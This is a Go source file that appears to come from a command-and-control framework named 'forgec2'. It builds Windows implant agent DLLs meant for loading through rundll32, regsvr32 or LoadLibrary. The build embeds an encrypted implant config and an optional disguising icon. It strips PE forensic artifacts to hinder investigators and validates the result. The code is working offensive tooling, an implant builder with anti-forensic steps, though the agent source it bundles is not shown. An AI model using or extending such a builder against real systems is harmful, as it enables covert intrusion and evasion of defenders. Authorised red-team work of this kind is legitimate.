package payload

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// checkCgoCrossCompiler returns an error if CGO cross-compilation for
// windows/amd64 or windows/arm64 is not available. On Windows the native
// toolchain (or an installed gcc/clang) is used; on other hosts a
// mingw-w64 cross-compiler must be present. Only real mingw targets are
// accepted — a generic Linux gcc would pass the check and then fail the
// build with a confusing error.
func checkCgoCrossCompiler(goarch string) error {
	if runtime.GOOS == "windows" {
		// CGO on Windows needs gcc or clang in PATH (mingw-w64 or
		// LLVM). Verify it instead of assuming success.
		for _, name := range []string{"gcc", "clang", "x86_64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc"} {
			if _, err := exec.LookPath(name); err == nil {
				return nil
			}
		}
		return fmt.Errorf("CGO compiler not found: install mingw-w64 (or LLVM clang) and ensure gcc/clang is in PATH, or set CC")
	}
	// Look for mingw-w64 cross-compiler (used by Go for CGO cross-builds)
	cc := os.Getenv("CC")
	if cc != "" {
		if _, err := exec.LookPath(cc); err == nil {
			return nil
		}
	}
	// Common names for the cross-compiler based on target arch. A bare
	// "gcc" is intentionally NOT accepted: a host gcc cannot produce a
	// Windows PE and the build would fail later anyway.
	var candidates []string
	switch goarch {
	case "arm64":
		candidates = []string{"aarch64-w64-mingw32-gcc", "aarch64-w64-mingw32-gcc.exe"}
	default:
		candidates = []string{"x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc.exe"}
	}
	for _, c := range candidates {
		if _, err := exec.LookPath(c); err == nil {
			return nil
		}
	}
	if goarch == "arm64" {
		return fmt.Errorf("CGO cross-compiler for arm64 not found: install aarch64 mingw-w64 (e.g. apt install gcc-mingw-w64-aarch64) or set CC environment variable")
	}
	return fmt.Errorf("CGO cross-compiler for amd64 not found: install mingw-w64 (e.g. apt install gcc-mingw-w64-x86-64) or set CC environment variable")
}

// CheckDLLBuildPreconditions reports whether this host can produce a Windows
// DLL for the given requested architecture, before any build job is queued.
//
// GenerateWindowsDLL performs the same two checks, but only after extracting
// agent sources into a temp dir and writing the config inject file. A server
// with no mingw-w64 therefore accepted the request, answered 200
// {"status":"building"}, and only failed once the queued job reached the
// compiler check — a failure an operator sees as a stalled build rather than
// as "this server cannot build DLLs at all". Whether the toolchain is present
// is a fixed property of the host, so re-discovering it per attempt is waste.
//
// Both checks are read-only (PATH lookups) and conservative: they only report
// what would certainly fail, so a host that can build still can.
func CheckDLLBuildPreconditions(architecture string, obfuscate bool) error {
	goarch, err := resolveBuildArch("windows", architecture)
	if err != nil {
		return err
	}
	if obfuscate {
		// Same rejection as buildAgentBinaryDLL, which runs garble and
		// -buildmode=c-shared at once.
		return fmt.Errorf("garble obfuscation is not supported with -buildmode=c-shared; disable obfuscation for DLL builds")
	}
	if err := checkCgoCrossCompiler(goarch); err != nil {
		return fmt.Errorf("DLL build requires CGO: %w", err)
	}
	return nil
}

// GenerateWindowsDLL builds the Windows agent DLL (buildmode=c-shared)
// for use with rundll32 / regsvr32 / LoadLibrary.
func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
	dataDir := filepath.Dir(outputDir)
	profile := NormalizeImplantConfig(&cfg, dataDir)
	if err := ValidateImplantBuild("windows", "dll", &cfg); err != nil {
		return "", err
	}
	plan, err := resolveAgentPlan(&cfg)
	if err != nil {
		return "", err
	}

	tmpDir, err := os.MkdirTemp("", "forgec2-agent-dll-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}
	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH")
	}

	if err := extractAgentSources(payloadFS, tmpDir, plan); err != nil {
		return "", err
	}

	if err := prepareAgentModule(goCmd, tmpDir, "windows", true, plan, cfg.Win7Compat); err != nil {
		return "", err
	}

	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")

	// Windows icon handling (DLL also supports .rsrc)
	if err := injectIconResource(tmpDir, cfg); err != nil {
		fmt.Printf("icon injection warning: %v\n", err)
	}

	outName := cfg.Filename
	if outName == "" {
		outName = uniqueBuildName("forgec2_agent", ".dll")
	}
	if !strings.HasSuffix(strings.ToLower(outName), ".dll") {
		outName += ".dll"
	}
	outName = safeBuildFileName(outName)
	outPath, buildPath, err := prepareBuildOutput(outputDir, outName)
	if err != nil {
		return "", err
	}
	defer os.Remove(buildPath)
	// c-shared writes a C header next to the DLL; remove it on every path so a
	// failed post-processing step cannot leave build material orphaned.
	hPath := strings.TrimSuffix(buildPath, filepath.Ext(buildPath)) + ".h"
	defer os.Remove(hPath)

	goarch, err := resolveBuildArch("windows", cfg.Architecture)
	if err != nil {
		return "", err
	}
	if err := buildAgentBinaryDLL(goCmd, tmpDir, ldflags, buildPath, cfg.Obfuscate, "windows", goarch, blob, sKey, cfg.Win7Compat); err != nil {
		return "", err
	}

	// Strip PE forensic artifacts in every mode (garble does not clean them)
	// and remove the Go-generated .h export header next to the DLL.
	if err := stripPEArtifacts(buildPath); err != nil {
		return "", fmt.Errorf("strip PE artifacts: %w", err)
	}

	if cfg.SelfCheck {
		if err := patchSelfCheckHash(buildPath); err != nil {
			return "", err
		}
	}

	// Fail loudly (rather than deliver a corrupt binary) if the produced DLL is
	// malformed or the wrong architecture.
	if err := validatePE(buildPath, windowsMachine(goarch)); err != nil {
		return "", fmt.Errorf("generated dll failed PE validation: %w", err)
	}

	if err := commitBuildOutput(buildPath, outPath, 0755); err != nil {
		return "", err
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("build succeeded but no output file at %s: %w", outPath, err)
	}

	return outPath, nil
}

// buildAgentBinaryDLL runs `go build -buildmode=c-shared` with CGO_ENABLED=1.
// It checks for cross-compiler availability on non-Windows hosts.
func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool, goos, goarch, configBlob, sConfigKey string, win7 bool) error {
	if err := writeConfigInjectFile(workDir, configBlob, sConfigKey); err != nil {
		return fmt.Errorf("write config inject file: %w", err)
	}
	if obfuscate {
		return fmt.Errorf("garble obfuscation is not supported with -buildmode=c-shared; disable obfuscation for DLL builds")
	}

	if err := checkCgoCrossCompiler(goarch); err != nil {
		return fmt.Errorf("DLL build requires CGO: %w", err)
	}

	buildArgs := []string{"build", "-buildmode=c-shared", "-mod=mod"}
	if tags := wintunBuildTags(goos, goarch, workDir); len(tags) > 0 {
		buildArgs = append(buildArgs, "-tags", strings.Join(tags, ","))
	}
	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, goCmd, append(buildArgs,
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-buildvcs=false",
		".",
	)...)
	cmd.Dir = workDir
	cmd.Env = goToolchainEnv(win7,
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=1",
	)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return fmt.Errorf("go build (c-shared) timed out after %s: %w", buildTimeout, err)
		}
		return fmt.Errorf("go build (c-shared) failed: %w\n%s", err, stderr.String())
	}
	return nil
}
